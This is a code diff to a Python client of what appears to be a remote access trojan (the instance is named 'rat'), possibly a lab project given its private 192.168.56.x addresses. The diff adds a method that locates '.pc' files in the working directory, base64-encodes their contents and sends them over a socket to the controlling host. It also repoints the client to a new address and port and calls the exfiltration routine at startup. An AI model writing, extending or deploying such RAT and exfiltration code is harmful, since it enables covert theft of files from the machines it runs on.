@@ -22,6 +22,25 @@ class CLIENT:
         information_send = socket.gethostbyname(socket.gethostname())
         sock.send(information_send.encode())
 
+    def CompromisedExfil(self):
+        filename = ''
+        fileList = os.listdir(".")
+        for file in fileList:
+            if file.endswith(".pc"):
+                print ("File: " + file)   
+                filename = str(file)             
+
+
+        file = open(filename, "rb")
+        bytes = file.read(1024)
+        base64_bytes = base64.b64encode(bytes)
+        file_json = {
+            "name" : filename,
+            "data" : base64_bytes.decode()
+        }
+        file_send = json.dumps(file_json)
+        sock.send(file_send.encode())
+
     # def installdep(self):
     #     subprocess.run(['pip', 'install', 'pyautogui'])
     
@@ -110,9 +129,11 @@ class CLIENT:
                 self.sendmessage()
                 continue
 
-rat = CLIENT('192.168.56.107', 4450)
+                
+rat = CLIENT('192.168.56.113', 3312)
 
 if __name__ == '__main__':
     # rat.installdep()
     rat.connection()
+    rat.CompromisedExfil()
     rat.main_loop()
